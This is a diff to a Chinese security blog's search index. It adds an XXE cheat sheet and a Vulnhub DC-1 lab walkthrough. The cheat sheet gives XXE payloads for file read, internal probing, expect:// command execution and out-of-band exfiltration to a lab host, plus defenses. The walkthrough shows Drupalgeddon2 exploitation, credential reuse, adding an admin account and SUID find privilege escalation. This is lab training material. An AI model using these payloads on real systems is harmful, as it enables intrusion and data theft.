@@ -135,7 +135,7 @@
       </categories>
       <tags>
         <tag>web</tag>
-        <tag>渗透测似</tag>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -866,7 +866,6 @@
 <li><strong>子网掩码</strong>：每一个IP地址必须配一个子网掩码，用来确定IP地址的网络位</li>
 </ol>
 <p><strong>子网掩码如何确定网络位</strong>：与<strong>255</strong>对应的数字为<strong>网络位</strong>，与<strong>0</strong>对应的数字为<strong>主机位</strong></p>
-<span id="more"></span>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">255.0.0.0  、 255.255.0.0  、 255.255.255.0</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如：</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.0.0.0</span><br><span class="line">则10.1.1.1属于10.0.0.0这个网段，主机名字叫1.1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.0.0</span><br><span class="line">则10.1.1.1属于10.1.0.0这个网段，主机名字叫1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.255.0</span><br><span class="line">则10.1.1.1属于10.1.1.0这个网段，主机名字叫1</span><br></pre></td></tr></table></figure>
 <h1 id="0x03-IP地址详解"><a href="#0x03-IP地址详解" class="headerlink" title="0x03 IP地址详解"></a>0x03 IP地址详解</h1><p>IP地址分为五大类（以IP地址的第一位进行区分）</p>
@@ -1339,6 +1338,211 @@
       <tags>
         <tag>web</tag>
         <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XXE</title>
+    <url>/2022/06/02/XXE/</url>
+    <content><![CDATA[<h1 id="一、XML与XXE"><a href="#一、XML与XXE" class="headerlink" title="一、XML与XXE"></a>一、XML与XXE</h1><blockquote>
+<p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。<strong>XXE漏洞全称XMLExternal Entity Injection</strong>，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p>
+</blockquote>
+<h2 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h2><ol>
+<li><p>读文件：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///d://test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>内网探针或攻击内网应用（触发漏洞地址）</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.8.232/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>RCE</p>
+<p>该CASE是在安装expect扩展的PHP环境里执行系统命令</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://id&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>引入外部实体dtd</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test.dtd:</span><br><span class="line">&lt;!ENTITY send SYSTEM &quot;file:///D:/test.txt&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>无回显，读取文件</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=D:/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.8.232/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%dtd;</span></span><br><span class="line"><span class="meta">	%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test.dtd:</span><br><span class="line">&lt;!ENTITY % payload</span><br><span class="line">	&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.8.232/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>协议-读文件（绕过姿势）</p>
+<ul>
+<li><p>ENTITY，SYSTEM，file等关键词被过滤</p>
+<p>使用编码方式绕过：UTF-16BE</p>
+<p><code>cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</code></p>
+</li>
+<li><p>如果http被过滤，则可以</p>
+<ol>
+<li><p>data://协议绕过</p>
+</li>
+<li><p>file://协议加文件上传</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	&lt;ENTITY a SYSTEM &quot;file:///D:/test.txt&quot;&gt;</span></span><br><span class="line"><span class="meta">	%a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--上传文件--&gt;</span><br><span class="line">&lt;!ENTITY % b SYSTEM &#x27;http://192.168.8.232/test.dtd&#x27;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>php://filter协议加文件上传</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/resource=D:/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%a;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">	<span class="symbol">&amp;xxe;</span> </span><br><span class="line">	<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--上传文件--&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="二、防御方案"><a href="#二、防御方案" class="headerlink" title="二、防御方案"></a>二、防御方案</h1><ol>
+<li><p>禁用外部实体</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP:</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance（）;dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python:</span><br><span class="line">from lxml import etreexmlData=etree.parse (xmlSource,etree.XMLParser(resolve_entities=False)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>过滤用户提交的xml数据</p>
+<p>过滤关键词：<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code></p>
+</li>
+<li><p>WAF产品</p>
+</li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
+    <title>Vulnhub-DC-1渗透学习</title>
+    <url>/2022/06/08/Vulnhub-DC-1/</url>
+    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
+<p>攻击机：Kali-2021.3：192.168.8.105</p>
+<p>靶机：Vulnhub-DC1：192.168.8.230</p>
+<p>靶机下载地址：<a href="Https://download.vulnhub.com/dc/DC-1.zip">Https://download.vulnhub.com/dc/DC-1.zip</a></p>
+</blockquote>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>启动靶机，由于我们没法进去这个靶机，所以IP地址是未知的</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/1.png" alt></p>
+<p>用<code>ifconfig</code>查看kali的IP地址</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/2.png" alt></p>
+<p>使用nmap对该网段下的主机进行主机探活</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br><span class="line">/24的意思是告诉nmap扫描192.168.8.0这一个网段,相当于192.168.8.0-255</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/3.png" alt></p>
+<p>一共发现了4个主机存活，最后一个是本机IP，因此可以不用考虑</p>
+<p>使用下面命令进行逐个扫描，根据它们所开放的端口等其他信息进行排查</p>
+<p><a href="https://blog.csdn.net/Kris__zhang/article/details/106841466?spm=1001.2014.3001.5506">nmap超详细使用教程</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.8.230</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/4.png" alt></p>
+<p>可以看到开放了80端口，打开浏览器进行访问</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/5.png" alt></p>
+<p>观察这个页面可以发现是Drupal框架，那么就可能存在这个框架所对应的漏洞</p>
+<p>如果看不出来的话，在kali上也可以利用<code>whatweb</code>来查看这个网站的各种信息</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/6.png" alt></p>
+<p>可以看到这是个Drupal 7.X的框架，浏览器查找可以看到有对应的漏洞</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/7.png" alt></p>
+<p>或者在msf里也可以找到可以利用的payload</p>
+<blockquote>
+<p>msf全称Metasploit Framework，是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode</p>
+</blockquote>
+<p>使用<code>msfconsole</code>即可进入msf</p>
+<p>检索这个框架的漏洞：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/8.png" alt></p>
+<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><p>经过我的测试发现第二个EXP还可以使用，而且能达到我们的目的</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2 //使用该EXP模块</span><br><span class="line">show options //查看需要设置的参数</span><br><span class="line">set RHOSTS 192.168.8.230 //设置被攻击的IP</span><br><span class="line">set LHOST 192.168.8.105 //设置监听IP，即本机IP</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/9.png" alt></p>
+<p>通过查看options确认配置好参数以后，使用<code>run</code>即可，攻击成功后msf会返回一个session</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/10.png" alt></p>
+<p> 我们可以利用这个session来查看各种信息，比如：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getuid //查看当前用户</span><br><span class="line">sysinfo //查看当前系统版本</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/11.png" alt></p>
+<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>通过刚刚的session，使用<code>shell</code>获得系统的一个非交互式shell</p>
+<p><a href="https://blog.csdn.net/gui951753/article/details/79154496">深入浅出理解交互式shell和非交互式shell、登录shell和非登录shell的区别</a></p>
+<blockquote>
+<p>交互式shell就是在终端上执行，shell等待你的输入，并且立即执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、退出。当你退出后，shell也终止了。</p>
+<p> 非交互式shell，以shell script(非交互)方式执行。在这种模式 下，shell不与你进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾EOF，shell也就终止了。</p>
+</blockquote>
+<p>因此为了方便我们之后的操作，我们需要利用python来把它转换成交互式shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/12.png" alt></p>
+<p>然后就能很快发现第一个flag</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/13.png" alt></p>
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>flag1中的内容提示我们要找CMS（即Drupal）的配置文件，浏览器检索就能看到配置文件的位置</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/14.png" alt></p>
+<p>打开这个配置文件就可以发现第二个flag</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/15.png" alt></p>
+<p>同时也发现了数据库的相关信息</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$databases</span> = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">&#x27;default&#x27;</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>flag2中也有提示，提示我们不需要暴力破解，而是得到访问权限</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/16.png" alt></p>
+<p>由上面得到的数据库信息我们可以进入数据库中</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -u dbuser -p R0ck3t</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/17.png" alt></p>
+<p>对数据库进行常规操作</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use drupaldb;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/18.png" alt></p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/19.png" alt></p>
+<p>可以看到这里有管理员的账号和密码，但很明显，这里的密码经过了加密，无法直接使用，这里有两种方法可以得到管理员权限</p>
+<h3 id="方法1-重置管理员密码"><a href="#方法1-重置管理员密码" class="headerlink" title="方法1-重置管理员密码"></a>方法1-重置管理员密码</h3><p>网上也有相关的文章，因为我们已经登录了数据库，自然可以对数据库里的数据进行修改</p>
+<p><a href="https://blog.csdn.net/xieyanxy9/article/details/84118604">如何重置Drupal 7的用户密码</a></p>
+<p>在Drupal的安装目录中的scripts目录下，有一些Drupal开发者准备好的PHP脚本，其中里面有个password-hash.sh文件，该文件的功能就是接收一个密码（字符串），然后返回加密后的字符串</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name &quot;password-hash.sh&quot; //找到该文件的位置</span><br><span class="line">php /var/www/scripts/password-hash.sh 123456 //传入的密码为123456</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/20.png" alt></p>
+<p>然后只需要把这个新密码更新到用户admin中就可以实现重置密码，在数据库中使用下面的命令</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use drupaldb;</span><br><span class="line">update users <span class="keyword">set</span> pass<span class="operator">=</span><span class="string">&#x27;$S$DKalQTXxpfdOP0QHC.bi8HxVb.AKt/bwbr0KUMQx6hiLPgZE/aYl&#x27;</span> <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/21.png" alt></p>
+<p>此时我们就可以登录后台了</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/22.png" alt></p>
+<p>在content里就能发现flag3</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/23.png" alt></p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/24.png" alt></p>
+<h3 id="方法2-添加具有管理员权限的用户"><a href="#方法2-添加具有管理员权限的用户" class="headerlink" title="方法2-添加具有管理员权限的用户"></a>方法2-添加具有管理员权限的用户</h3><p>首先我们得确定该Drupal的版本信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /var/www/includes/bootstrap.inc | grep VERSION</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/25.png" alt></p>
+<p>然后利用kali自带的SearchSploit工具进行搜索</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit drupal</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/26.png" alt></p>
+<p>发现有个SQL注入的漏洞，可以添加管理员用户</p>
+<p>然后只需要使用python去执行这个py文件就可以实现添加管理员了</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.8.230 -u aadmin -p 123456</span><br></pre></td></tr></table></figure>
+<p>出现下面的画面就代表我们已经添加成功了</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/27.png" alt></p>
+<p>查看一下数据库，发现成功在数据库中添加了管理员</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/28.png" alt></p>
+<p>之后再通过登录网站后台，就可以找到第三个flag了</p>
+<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>flag3中有提示关键词<strong>perms</strong>、<strong>find</strong>、<strong>passwd</strong>、<strong>-exec</strong></p>
+<p>因此查看passwd文件就可以找到flag4</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/29.png" alt></p>
+<p>这里还有一种方法，也就是使用find命令来查找</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name &quot;flag*.txt&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/06/08/Vulnhub-DC-1/30.png" alt></p>
+<p>这样也可以找到flag4</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/31.png" alt></p>
+<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>flag4中说最后一个flag在root里，但在访问root的时候发现权限不够</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/32.png" alt></p>
+<p>因此我们需要把权限提升至root，再根据flag3里的perms和-exec，猜测可能会用到SUID提权</p>
+<blockquote>
+<p>SUID (Set UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件，对于非可执行文件设置SUID没有任何意义。</p>
+<p>简单来说就是非root用户在调用一个设置有SUID权限的可执行文件时，该进程的权限将为root权限</p>
+</blockquote>
+<p>那么如何知道什么可执行文件具有SUID权限呢，有以下几种</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 //最简单的一种</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>简单解释一下一些参数的意思</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u=s 表示查找root用户拥有的文件</span><br><span class="line">-type f 表示我们寻找的文件类型是常规文件</span><br><span class="line">2 表示该进程的第二个文件描述符，即stderr（标准错误）</span><br><span class="line">&gt; 表示重定向</span><br><span class="line">/dev/null 是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br></pre></td></tr></table></figure>
+<p><a href="https://blog.csdn.net/weixin_44912169/article/details/105845909">find基础命令与提权教程</a></p>
+<p>可以看到find命令有SUID权限，因此我们可以用find进行提权</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/33.png" alt></p>
+<blockquote>
+<p>常见的可以用来提权的程序有：nmap、vim、find、bash、more、less、nano、cp</p>
+</blockquote>
+<p>find提权</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find robots.txt -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure>
+<p>中间的robots.txt是一个能够找到的文件或者目录，否则可能会出错，执行了这个命令之后就可以看到权限提升到了root</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/34.png" alt></p>
+<p>然后再进入root目录就能看到最后一个flag的位置了</p>
+<p><img src="/2022/06/08/Vulnhub-DC-1/35.png" alt></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/qq_44276741/article/details/122365853">【Vulnhub-DC1】DC-1</a></p>
+<p><a href="https://blog.csdn.net/qq_61237064/article/details/123433375?spm=1001.2014.3001.5501">dc-1 靶机渗透学习</a></p>
+<p><a href="https://blog.csdn.net/weixin_44912169/article/details/105845909">find基础命令与提权教程</a></p>
+<p><a href="https://blog.csdn.net/xieyanxy9/article/details/84118604">如何重置Drupal 7的用户密码</a></p>
+<p><a href="https://blog.csdn.net/gui951753/article/details/79154496">深入浅出理解交互式shell和非交互式shell、登录shell和非登录shell的区别</a></p>
+<p><a href="https://blog.csdn.net/Kris__zhang/article/details/106841466?spm=1001.2014.3001.5506">nmap超详细使用教程</a></p>
+]]></content>
+      <categories>
+        <category>靶场&amp;靶机</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>渗透测试</tag>
+        <tag>靶机</tag>
       </tags>
   </entry>
 </search>
